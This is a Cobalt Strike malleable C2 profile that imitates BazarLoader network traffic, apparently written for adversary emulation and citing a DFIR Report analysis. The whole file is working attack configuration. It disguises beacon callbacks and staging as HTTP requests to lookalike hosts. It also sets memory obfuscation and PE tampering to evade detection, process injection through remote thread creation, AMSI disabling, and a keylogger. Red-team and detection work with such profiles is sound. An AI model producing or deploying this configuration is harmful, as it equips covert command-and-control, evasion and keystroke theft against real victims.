#bazarloader profile
#https://thedfirreport.com/2021/10/04/bazarloader-and-the-conti-leaks/
#xx0hcd

###Global Options###
set sample_name "bazarloader.profile";

set sleeptime "5000";
set jitter    "14";
set useragent "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";

set host_stage "false";

###DNS options###
dns-beacon {
    # Options moved into 'dns-beacon' group in 4.3:
    set dns_idle             "8.8.8.8";
    set dns_max_txt          "220";
    set dns_sleep            "0";
    set dns_ttl              "1";
    set maxdns               "255";
    set dns_stager_prepend   "";
    set dns_stager_subhost   "";
     
    # DNS subhost override options added in 4.3:
    set beacon               "";
    set get_A                "";
    set get_AAAA             "";
    set get_TXT              "";
    set put_metadata         "";
    set put_output           "";
    set ns_response          "";
}

###SMB options###
set pipename "ntsvcs_##";
set pipename_stager "scerpc_##";
set smb_frame_header "";

###TCP options###
set tcp_port "8000";
set tcp_frame_header "";

###SSH options###
#set ssh_banner "Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-1065-aws x86_64)";
set ssh_pipename "SearchTextHarvester##";

###SSL Options###
#https-certificate {
#    set keystore "";
#    set password "";
#}

https-certificate {
    set C "KZ";
    set CN "forenzik.kz";
#    set L "";
    set O "NN Fern Subject";
    set OU "NN Fern";
    set ST "KZ";
    set validity "365";
}

#code-signer {
    #set keystore "your_keystore.jks";
    #set password "your_password";
    #set alias "server";
#}

###HTTP-Config Block###
#http-config {
#    set headers "Server, Content-Type";
#    header "Content-Type" "text/html;charset=UTF-8";
#    header "Server" "nginx";
#
#    set trust_x_forwarded_for "false";
#    
#    set block_useragents "curl*,lynx*,wget*";
#    set allow_useragents "";
#}

#set headers_remove "image/x-xbitmap, image/pjpeg, application/vnd";

###HTTP-GET Block###
http-get {

    set uri "/www/handle/doc";
    
    client {

        header "Host" "yawero.com";
        #header "Vary" "";

	   
    metadata {
        base64;
        prepend "ANID=";
        header "Cookie";

    }

    }

    server {
    
    	header "Server" "nginx/1.10.3 (Ubuntu)";
    	header "Content-Type" "application/octet-stream";
        header "Connection" "keep-alive";
        header "Vary" "Accept";
        header "Pragma" "public";
        header "Expires" "0";
        header "Cache-Control" "must-revalidate, post-check=0, pre-check=0";
 
        output {

            netbios;
            print;
        }
    }
}



###HTTP-Post Block###
http-post {
    
    set uri "/IMXo /PJkW";
    #set verb "GET";
    set verb "POST";

    client {

	header "Host" "gojihu.com";
        
        output {
            base64url;
	    print;
        }

        id {
	    base64url;
	    prepend "ANID=";
            header "Cookie";

        }
    }

    server {
    
        header "Server" "nginx/1.10.3 (Ubuntu)";
    	header "Content-Type" "application/octet-stream";
        header "Connection" "keep-alive";
        header "Vary" "Accept";
        header "Pragma" "public";
        header "Expires" "0";
        header "Cache-Control" "must-revalidate, post-check=0, pre-check=0";

        output {
            netbios;
            print;
        }
    }
}



###HTTP-Stager Block###
http-stager {

    set uri_x86 "/40vd";
    set uri_x64 "/HjIa";

    client {
        
	header "Host" "sazoya.com";
    }

    server {
        
        header "Server" "nginx/1.10.3 (Ubuntu)";
    	header "Content-Type" "application/octet-stream";
        header "Connection" "keep-alive";
        header "Vary" "Accept";
        header "Pragma" "public";
        header "Expires" "0";
        header "Cache-Control" "must-revalidate, post-check=0, pre-check=0";
	
	output {
	
	    prepend "";
	    
	    append "";
	    print;
	}

    }
}


###Malleable PE/Stage Block###
stage {
    set checksum       "0";
    set compile_time   "13 Jul 2021 11:58:09";
    set entry_point    "32308";
    set image_size_x86 "1798144";
    set image_size_x64 "1798144";
    set name           "21.dll";

    set userwx 	        "false";
    set cleanup	        "true";
    set sleep_mask	"true";
    set stomppe	        "true";
    set obfuscate	"true";
    set rich_header     "\x1d\x67\x43\x53\x59\x06\x2d\x00\x59\x06\x2d\x00\x59\x06\x2d\x00\x3c\x60\x29\x01\x4c\x06\x2d\x00\x3c\x60\x2e\x01\x49\x06\x2d\x00\x3c\x60\x28\x01\xe0\x06\x2d\x00\x0b\x6e\x28\x01\x47\x06\x2d\x00\x0b\x6e\x29\x01\x49\x06\x2d\x00\x0b\x6e\x2e\x01\x51\x06\x2d\x00\x3c\x60\x2c\x01\x5e\x06\x2d\x00\x59\x06\x2c\x00\x28\x06\x2d\x00\xce\x6f\x29\x01\x5a\x06\x2d\x00\xce\x6f\x2d\x01\x58\x06\x2d\x00\xce\x6f\xd2\x00\x58\x06\x2d\x00\xce\x6f\x2f\x01\x58\x06\x2d\x00\x52\x69\x63\x68\x59\x06\x2d\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
      
    #set allocator "HeapAlloc";
    set magic_mz_x86 "MZRE";
    set magic_mz_x64 "MZAR";
    set magic_pe "EA";
    
    set sleep_mask "true";
    
    set smartinject "true";

    #set module_x86 "wwanmm.dll";
    #set module_x64 "wwanmm.dll";

    transform-x86 {
        #prepend "\x90\x90\x90";
        strrep "ReflectiveLoader" "";
        strrep "beacon.dll" "";
        }

    transform-x64 {
        #prepend "\x90\x90\x90";
        strrep "ReflectiveLoader" "";
        strrep "beacon.x64.dll" "";
        }

    string "AWAVAUATVWUSH";
    string "UAWAVVWSPH";
    string "AWAVAUATVWUSPE";
    string "AVVWSH";
    string "m1t6h/o*i-j2p2g7i0r.q6j3p,j2l2s7p/s9j-q0f9f,i7r2g1h*i8r5h7g/q9j4h*o7i4r9f7f3g*p/q7o1e5n8m1q4n.e+n0i*r/i*k2q-g0p-n+q7l3s6h-h6j*q/";
    string "s-e6m/f-g*j.i8p1g6j*i,o1s9o5f8r-p1l1k4o9n9l-s7q8g+n,f4t0q,f6n9q5s5e6i-f*e6q-r6g8s1o6r0k+h6p9i4f6p4s6l,g0p1j6l4s1l4h2f,s9p8t5t/g6";
    string "o1s1s9i2s.f1g5l6g5o2k8h*e9j2o3k0j1f+n,k9h5l*e8p*s2k5r3j-f5o-f,g+e*s-e9h7e.t0e-h3e2t1f8j5k/m9p6n/j3h9e1k3h.t6h2g1p.l*q8o*t9l6p4s.";
    string "k7s9g7m5k4s5o3h6k.s1p.h9k.s-o8e*f5n9r,l4f-s5k3p2f/n1r.i*f*n-p4s3e7m9p2t/e3m5g1s9e0m1q/j*e*m-r*i+h.p9s2f6h-p5s6e2h8p1s*j.h3p-s.h0";
    string "[_^A^A_]";
    string "%c%c%c%c%c%c%c%c%cMSSE-%d-server";
    string "  VirtualQuery failed for %d bytes at address %p";
    string "1brrTbrrTbrrTbrrTbrrTbrrTbrrTbrrTbrrTbrrTbrrTbrrTbrrTbrrTbrrTbrrTbrrTbrrTbrrTbrrTbrrTbrrTbrrTbrrTbrrTbrrTbrrTbrrTbrrTbrrTbrrTbrr";
    string "\\zL:\\zL";
    string "\\\\z:\\\\z";
    string "  VirtualProtect failed with code 0x%x";
    string "3\\)z'\\\\zL\\>z)\\\\zL\\/z \\\\zL\\9z8\\\\zL\\0z:\\\\zL\\0z8\\\\zL\\:z-\\\\zL\\*z%\\\\zL\\4z5\\\\zL\\=z6\\\\zL\\9z9\\\\zL\\1z'";
    string "]zL\\=z*\\qz6\\=zL\\\\zL\\=z>\\qz-\\9zL\\\\zL\\=z>\\qz.\\4zL\\\\zL\\=z>\\qz(\\&zL\\\\zL\\=z>\\qz)\\;zL\\\\zL\\=z>\\qz%\\-zL\\\\z";
    string "  Unknown pseudo relocation protocol version %d.";
    string "\\L*L\\]qN\\WHKl]qO\\W{j\\XJL\\][G\\}";

}

###Process Inject Block###
process-inject {

    set allocator "VirtualAllocEx";		

    set min_alloc "16700";

    set userwx "false";  
    
    set startrwx "true";
        
    transform-x86 {
        prepend "\xec\x90\xec\x90\xec\x90\xec\x90\xec\x90\xec\x90\xec\x90\xec\x90\xec\x90\xec\x90\xec\x90\xec\x90\xec\x90\xec\x90\xec\x90";
    }
    transform-x64 {
        prepend "\xec\x90\xec\x90\xec\x90\xec\x90\xec\x90\xec\x90\xec\x90\xec\x90\xec\x90\xec\x90\xec\x90\xec\x90\xec\x90\xec\x90\xec\x90\xec\x90";
    }

    execute {
        #CreateThread;
        #CreateRemoteThread;       

        CreateThread "ntdll.dll!RtlUserThreadStart+0x1000";

        #SetThreadContext;

        NtQueueApcThread-s;

        #NtQueueApcThread;

        CreateRemoteThread "ntdll.dll!RtlUserThreadStart+0x1000";

        RtlCreateUserThread;
    }
}

###Post-Ex Block###
post-ex {

    set spawnto_x86 "%windir%\\syswow64\\rundll32.exe";
    set spawnto_x64 "%windir%\\sysnative\\rundll32.exe";

    set obfuscate "true";

    set smartinject "true";

    set amsi_disable "true";
    
    set thread_hint "ntdll.dll!RtlUserThreadStart+0x1000";
    set pipename "DserNamePipe##, PGMessagePipe##, MsFteWds##";
    set keylogger "SetWindowsHookEx";

}
